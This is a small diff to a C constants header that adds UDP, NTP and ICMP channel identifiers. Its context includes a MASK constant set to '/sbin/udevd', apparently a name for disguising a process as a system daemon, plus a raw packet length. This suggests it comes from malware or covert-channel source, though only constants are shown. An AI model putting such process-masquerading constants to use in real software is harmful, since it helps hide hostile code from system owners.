@@ -31,6 +31,10 @@ NOTES: This file holds the constants used throughout the program.
 #define TRUE    1
 #define FALSE   0
 
+#define CHAN_UDP  0
+#define CHAN_NTP  1
+#define CHAN_ICMP 2
+
 #define MASK 	"/sbin/udevd"
 
 #define ETHER_IP_UDP_LEN 44
